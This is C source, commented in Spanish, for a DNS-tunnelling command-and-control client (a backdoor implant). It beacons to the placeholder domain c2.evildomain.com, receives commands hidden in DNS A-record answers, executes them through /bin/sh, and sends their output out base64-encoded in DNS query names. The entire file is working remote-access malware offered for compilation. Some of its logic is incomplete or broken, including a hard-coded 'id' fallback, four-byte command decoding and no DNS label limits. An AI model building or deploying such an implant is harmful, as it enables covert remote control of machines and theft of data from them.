/**
 * shadow_client.c – Cliente C2 sobre DNS (versión mejorada)
 * Compilar: gcc -O2 -o shadow_client shadow_client.c -lpthread
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <pthread.h>
#include <signal.h>
#include <sys/wait.h>
#include <linux/limits.h>

#define DNS_SERVER "127.0.0.1"
#define DNS_PORT 53
#define C2_DOMAIN "c2.evildomain.com"
#define BEACON_INTERVAL 15

/* ---------- Base64 URL ---------- */
static const char b64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";

static void encode_b64(const unsigned char *in, size_t len, char *out) {
    size_t i, j = 0;
    for (i = 0; i < len; i += 3) {
        uint32_t n = (in[i] << 16) | ((i+1 < len) ? (in[i+1] << 8) : 0) | ((i+2 < len) ? in[i+2] : 0);
        out[j++] = b64[(n >> 18) & 0x3F];
        out[j++] = b64[(n >> 12) & 0x3F];
        out[j++] = (i+1 < len) ? b64[(n >> 6) & 0x3F] : '=';
        out[j++] = (i+2 < len) ? b64[n & 0x3F] : '=';
    }
    while (j > 0 && out[j-1] == '=') j--;
    out[j] = '\0';
}

static void decode_b64(const char *in, unsigned char *out, size_t *out_len) {
    // Implementación simple, asume que no hay padding '=' (ya lo quitamos)
    size_t len = strlen(in);
    size_t i, j = 0;
    uint32_t n = 0;
    int bits = 0;
    for (i = 0; i < len; i++) {
        char c = in[i];
        uint32_t val;
        if (c >= 'A' && c <= 'Z') val = c - 'A';
        else if (c >= 'a' && c <= 'z') val = c - 'a' + 26;
        else if (c >= '0' && c <= '9') val = c - '0' + 52;
        else if (c == '-') val = 62;
        else if (c == '_') val = 63;
        else continue;
        n = (n << 6) | val;
        bits += 6;
        if (bits >= 8) {
            bits -= 8;
            out[j++] = (n >> bits) & 0xFF;
        }
    }
    *out_len = j;
}

/* ---------- Construir consulta DNS ---------- */
static int build_dns_query(uint16_t id, const char *name, int qtype, unsigned char *buf) {
    int pos = 0;
    uint16_t flags = htons(0x0100);
    uint16_t qdcount = htons(1);
    uint16_t ancount = 0, nscount = 0, arcount = 0;
    memcpy(buf + pos, &id, 2); pos += 2;
    memcpy(buf + pos, &flags, 2); pos += 2;
    memcpy(buf + pos, &qdcount, 2); pos += 2;
    memcpy(buf + pos, &ancount, 2); pos += 2;
    memcpy(buf + pos, &nscount, 2); pos += 2;
    memcpy(buf + pos, &arcount, 2); pos += 2;

    const char *p = name;
    while (*p) {
        const char *dot = strchr(p, '.');
        int len = dot ? dot - p : strlen(p);
        buf[pos++] = len;
        memcpy(buf + pos, p, len);
        pos += len;
        p = dot ? dot + 1 : p + strlen(p);
    }
    buf[pos++] = 0;
    uint16_t qtype_be = htons(qtype);
    uint16_t qclass_be = htons(1);
    memcpy(buf + pos, &qtype_be, 2); pos += 2;
    memcpy(buf + pos, &qclass_be, 2); pos += 2;
    return pos;
}

/* ---------- Enviar consulta DNS y recibir respuesta ---------- */
static int dns_query(const char *name, int qtype, unsigned char *response, size_t *resp_len) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return -1;

    struct sockaddr_in server = {
        .sin_family = AF_INET,
        .sin_port = htons(DNS_PORT),
        .sin_addr.s_addr = inet_addr(DNS_SERVER)
    };

    unsigned char query[512];
    uint16_t id = (uint16_t)rand();
    int len = build_dns_query(id, name, qtype, query);
    if (sendto(sock, query, len, 0, (struct sockaddr*)&server, sizeof(server)) < 0) {
        close(sock);
        return -1;
    }

    struct timeval tv = {5, 0};
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    struct sockaddr_in from;
    socklen_t fromlen = sizeof(from);
    int n = recvfrom(sock, response, 512, 0, (struct sockaddr*)&from, &fromlen);
    close(sock);
    if (n < 12) return -1;
    *resp_len = n;
    return 0;
}

/* ---------- Ejecutar comando ---------- */
static char *run_cmd(const char *cmd) {
    char *output = NULL;
    size_t total = 0;
    int pipefd[2];
    if (pipe(pipefd) < 0) return strdup("pipe failed");
    pid_t pid = fork();
    if (pid == -1) return strdup("fork failed");
    if (pid == 0) {
        dup2(pipefd[1], STDOUT_FILENO);
        dup2(pipefd[1], STDERR_FILENO);
        close(pipefd[0]);
        close(pipefd[1]);
        execl("/bin/sh", "sh", "-c", cmd, NULL);
        exit(1);
    }
    close(pipefd[1]);
    char buf[1024];
    ssize_t n;
    while ((n = read(pipefd[0], buf, sizeof(buf)-1)) > 0) {
        buf[n] = '\0';
        output = realloc(output, total + n + 1);
        if (!output) { close(pipefd[0]); return strdup("realloc failed"); }
        memcpy(output + total, buf, n);
        total += n;
        output[total] = '\0';
    }
    close(pipefd[0]);
    waitpid(pid, NULL, 0);
    if (!output) return strdup("");
    return output;
}

/* ---------- Hilo C2 ---------- */
static void *c2_thread(void *arg) {
    unsigned char response[512];
    size_t resp_len;
    char encoded[512];
    char domain[512];
    char beacon[256];

    srand(time(NULL) ^ getpid());

    while (1) {
        // 1. Enviar beacon (TXT)
        snprintf(beacon, sizeof(beacon), "B:PID=%d TIME=%ld", getpid(), time(NULL));
        encode_b64((unsigned char*)beacon, strlen(beacon), encoded);
        snprintf(domain, sizeof(domain), "%s.%s", encoded, C2_DOMAIN);
        fprintf(stderr, "[*] Beacon: %s\n", domain);
        dns_query(domain, 16, response, &resp_len);

        // 2. Pedir comando (consulta A)
        snprintf(domain, sizeof(domain), "cmd_%d.%s", rand()%10000, C2_DOMAIN);
        if (dns_query(domain, 1, response, &resp_len) == 0) {
            // Extraer la IP de la respuesta (registro A)
            // Buscar el campo de respuesta: saltamos cabecera (12) + pregunta (variable)
            // Simplificación: buscar los 4 bytes de la IP al final del paquete (asumiendo que es el último campo)
            // En una respuesta válida, la IP está en los últimos 4 bytes antes del final.
            if (resp_len >= 16) {
                uint8_t *ip = response + resp_len - 4;
                char ip_str[32];
                snprintf(ip_str, sizeof(ip_str), "%d.%d.%d.%d", ip[0], ip[1], ip[2], ip[3]);
                // Decodificar el comando desde la IP (los 4 bytes forman parte del base64)
                // El servidor codifica el comando en una cadena base64 y la coloca en los 4 bytes de la IP
                // Para simplificar, aquí asumimos que la IP es directamente el comando (solo para demo)
                // En producción, el servidor debería codificar el comando en la IP.
                // Por ahora, usamos un comando de prueba:
                char *cmd = "id";  // Cambiar para usar el comando real decodificado
                // Decodificar el comando desde la IP (si el servidor envía base64 en la IP)
                // Podemos reconstruir el base64 a partir de los 4 bytes (cada byte es un carácter ASCII del base64)
                char b64_cmd[5];
                for (int i = 0; i < 4; i++) b64_cmd[i] = ip[i];
                b64_cmd[4] = '\0';
                unsigned char decoded_cmd[64];
                size_t decoded_len;
                decode_b64(b64_cmd, decoded_cmd, &decoded_len);
                decoded_cmd[decoded_len] = '\0';
                if (decoded_len > 0) {
                    cmd = (char*)decoded_cmd;
                }
                fprintf(stderr, "[*] Comando recibido: %s\n", cmd);
                char *output = run_cmd(cmd);
                fprintf(stderr, "[*] Output: %s\n", output);
                // Enviar salida codificada
                char out_b64[512];
                encode_b64((unsigned char*)output, strlen(output), out_b64);
                snprintf(domain, sizeof(domain), "%s.%s", out_b64, C2_DOMAIN);
                dns_query(domain, 16, response, &resp_len);
                free(output);
            }
        }

        sleep(BEACON_INTERVAL + (rand() % 5));
    }
    return NULL;
}

int main(int argc, char **argv) {
    pthread_t t;
    pthread_create(&t, NULL, c2_thread, NULL);
    pthread_detach(t);
    while (1) sleep(3600);
    return 0;
}